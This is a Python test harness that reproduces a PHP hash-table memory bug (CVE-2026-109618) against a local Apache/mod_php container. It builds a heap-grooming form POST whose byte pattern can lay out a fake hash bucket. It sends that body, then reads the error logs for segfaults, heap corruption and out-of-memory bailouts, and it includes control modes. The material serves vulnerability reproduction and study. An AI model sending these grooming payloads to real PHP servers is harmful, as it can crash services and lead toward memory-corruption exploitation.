#!/usr/bin/env python3
"""
CVE-2026-109618 - incomplete hash bucket left by a bailed-out key allocation.

Public mechanism (Datadog Security Labs, 2026-10-21):
    Zend/zend_hash.c : _zend_hash_str_add_or_update_i()
        idx = ht->nNumUsed++;
        ht->nNumOfElements++;
        p = ht->arData + idx;
        p->key = key = zend_string_init(str, len, ...);   /* OOM here */
    The counters already include the new bucket while key/val were never
    written.  mod_php still runs request shutdown after a failed request
    startup, so zend_hash_destroy($_POST) walks that bucket and interprets
    whatever bytes are there as a zval.

Published trigger shape (application/x-www-form-urlencoded):
    '=' <binary payload> '&a=1&' 'Z'*3.5MB '[x]=1'

    1) empty field name -> zend_string_init(276 bytes) lands in the 320-byte
       size class and is released again because the name is empty
    2) 'a=1'            -> the small hash table reuses that just-freed block
    3) '<name>[x]=1'    -> array syntax reaches the string-key insert helper;
       the filter extension's key allocation succeeds, the $_POST one takes
       the same 3.5 MB copy again and crosses memory_limit -> bailout

Usage:
    python3 tests/cve_2026_109618_hash_oom.py --port 28081 --rounds 3
    python3 tests/cve_2026_109618_hash_oom.py --port 28081 --sweep 3.0,3.2,3.4,3.5,3.6
    python3 tests/cve_2026_109618_hash_oom.py --port 28081 --plain-name   # control
    python3 tests/cve_2026_109618_hash_oom.py --port 28081 --no-a         # control
"""
import argparse
import json
import os
import re
import socket
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG = os.path.join(ROOT, "evidence", "logs")


def log_path(container):
    return os.path.join(LOG, container, "apache", "error.log")


def log_len(container):
    try:
        return os.path.getsize(log_path(container))
    except OSError:
        return 0


def log_delta(container, offset):
    try:
        with open(log_path(container), "rb") as f:
            f.seek(offset)
            return f.read().decode("utf-8", "replace")
    except OSError:
        return ""


def count(pat, text):
    return len(re.findall(pat, text))


def build_body(payload_len, fill, name_len, plain_name=False, use_a=True,
               groom=True, pattern=None):
    """Groom payload.  `pattern` (bytes) is repeated to payload_len; it lets a
    single 32-byte Bucket { zval(16) h(8) key(8) } be laid out byte-exactly."""
    if pattern:
        payload = (pattern * (payload_len // len(pattern) + 1))[:payload_len]
    else:
        payload = bytes([fill]) * payload_len
    body = b""
    if groom:
        body += b"=" + payload + b"&"
    if use_a:
        body += b"a=1&"
    body += b"Z" * name_len
    body += b"[x]=1" if not plain_name else b"=1"
    return body


def send(port, path, body, timeout=180):
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    lport = s.getsockname()[1]
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: 127.0.0.1:{port}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    t0 = time.time()
    try:
        s.sendall(head)
        s.sendall(body)
    except (BrokenPipeError, ConnectionResetError) as e:
        s.close()
        return f"RESET_ON_SEND({e.__class__.__name__})", "", time.time() - t0, lport
    raw = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            raw += d
            if len(raw) > 262144:
                break
    except (ConnectionResetError, socket.timeout):
        pass
    finally:
        s.close()
    dt = time.time() - t0
    if not raw:
        return "NO_RESPONSE", "", dt, lport
    status = raw.split(b"\r\n", 1)[0].decode("latin1", "replace")
    bodytxt = raw.split(b"\r\n\r\n", 1)[1].decode("latin1", "replace") if b"\r\n\r\n" in raw else ""
    return status, bodytxt, dt, lport


def one_round(port, container, path, name_len, payload_len, fill, *,
              plain_name=False, use_a=True, groom=True, wait=1.2, pattern=None):
    body = build_body(payload_len, fill, name_len, plain_name, use_a, groom,
                      pattern=pattern)
    off = log_len(container)
    status, rbody, dt, lport = send(port, path, body)
    # prefork parent reaps a dead child asynchronously: drain long enough that
    # any AH00052 observed inside this window belongs to *this* request.
    deadline = time.time() + wait
    delta = ""
    while time.time() < deadline:
        time.sleep(0.2)
        delta = log_delta(container, off)
        if "AH00052" in delta:
            time.sleep(0.4)          # let the paired line(s) flush
            delta = log_delta(container, off)
            break
    delta = log_delta(container, off)

    # exact attribution: the PHP fatal line carries [pid N:tid N] [client ip:port]
    pid = None
    m = re.search(r"\[pid (\d+):tid \d+\] \[client [\d.]+:%d\]" % lport, delta)
    if m:
        pid = m.group(1)
    segv_pids = re.findall(r"AH00052: child pid (\d+) exit signal Segmentation fault", delta)
    segv = len(segv_pids)
    attributed = pid is not None and pid in segv_pids

    oom = re.search(r"Allowed memory size of (\d+) bytes exhausted\s*"
                    r"\(tried to allocate (\d+) bytes\)\s*in (\S+) on line (\d+)",
                    rbody) or re.search(
        r"Allowed memory size of (\d+) bytes exhausted.*?in (\S+) on line (\d+)",
        delta)
    heap = count(r"zend_mm_heap corrupted", delta)
    ran = "script_ran" in rbody
    err = ""
    m = re.search(r"(Allowed memory size of [^<\\r\\n]{0,120})", rbody)
    if m:
        err = m.group(1)
    return {
        "status": status,
        "wire_mb": round(len(body) / 1048576, 2),
        "script_ran": ran,
        "oom": bool(oom),
        "oom_detail": err,
        "segv": segv,
        "segv_pids": segv_pids,
        "pid": pid,
        "attributed": attributed,
        "ah00052": count(r"AH00052", delta),
        "heap_corrupt": heap,
        "secs": round(dt, 2),
        "lport": lport,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=28081)
    ap.add_argument("--container", default="vuln-a")
    ap.add_argument("--path", default="/urlenc/hit.php")
    ap.add_argument("--name-mb", type=float, default=3.5)
    ap.add_argument("--payload-len", type=int, default=276)
    ap.add_argument("--fill", default="41", help="hex byte used to groom")
    ap.add_argument("--pattern", default="",
                    help="hex string repeated as the groom payload (overrides --fill)")
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--sweep", default="", help="comma separated name sizes in MB")
    ap.add_argument("--plain-name", action="store_true", help="control: no [x]")
    ap.add_argument("--no-a", action="store_true", help="control: no a=1 field")
    ap.add_argument("--no-groom", action="store_true", help="control: no payload field")
    ap.add_argument("--wait", type=float, default=1.2,
                    help="seconds to drain logs after a request (prefork reaping)")
    ap.add_argument("--out", default="")
    a = ap.parse_args()

    fill = int(a.fill, 16)
    pattern = bytes.fromhex(a.pattern) if a.pattern else None
    sizes = [float(x) for x in a.sweep.split(",")] if a.sweep else [a.name_mb]
    results = []
    print(f"=== {a.container} :{a.port} {a.path} "
          f"(payload={a.payload_len}B fill=0x{fill:02x} "
          f"plain_name={a.plain_name} a_field={not a.no_a} groom={not a.no_groom})")
    for mb in sizes:
        name_len = int(mb * 1024 * 1024)
        for r in range(1, a.rounds + 1):
            res = one_round(a.port, a.container, a.path, name_len,
                            a.payload_len, fill,
                            plain_name=a.plain_name, use_a=not a.no_a,
                            groom=not a.no_groom, wait=a.wait,
                            pattern=pattern)
            res.update({"name_mb": mb, "round": r})
            results.append(res)
            tag = "CRASH(attr)" if res["attributed"] else (
                "CRASH" if (res["segv"] or res["heap_corrupt"]) else (
                    "OOM" if res["oom"] else ("RAN" if res["script_ran"] else "other")))
            print(f"  name={mb:>4.2f}MB r{r}: {res['status']:<24} "
                  f"wire={res['wire_mb']:>5.2f}MB {res['secs']:>6.2f}s "
                  f"script={int(res['script_ran'])} oom={int(res['oom'])} "
                  f"segv={res['segv']}(pid={res['pid']}) "
                  f"heap={res['heap_corrupt']}  -> {tag}")
            if res["oom_detail"]:
                print(f"      {res['oom_detail']}")
            if res["segv"]:
                time.sleep(0.3)
    total_segv = sum(r["segv"] for r in results)
    attributed = sum(1 for r in results if r["attributed"])
    print(f"--- segfaults: {total_segv} signal(s) / {len(results)} requests; "
          f"pid-attributed to this request: {attributed}")
    if a.out:
        os.makedirs(os.path.dirname(a.out), exist_ok=True)
        with open(a.out, "w") as f:
            json.dump({"args": vars(a), "results": results}, f, indent=2)
        print(f"--- wrote {a.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
